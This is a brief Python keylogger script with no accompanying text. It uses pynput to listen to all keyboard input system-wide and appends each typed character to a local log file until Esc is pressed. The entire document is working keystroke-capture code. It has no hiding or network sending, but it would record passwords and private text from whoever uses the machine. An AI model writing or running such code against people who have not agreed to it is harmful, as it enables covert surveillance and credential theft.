from pynput.keyboard import Key, Listener

log_file = "key_log.txt"
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if isinstance(key, Key):
                if key == Key.space:
                    f.write(' ')
                elif key == Key.enter:
                    f.write('\n')
                elif key == Key.esc:
                    return False  
            else:
                f.write(f'{key.char}')
    except AttributeError:
        pass

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
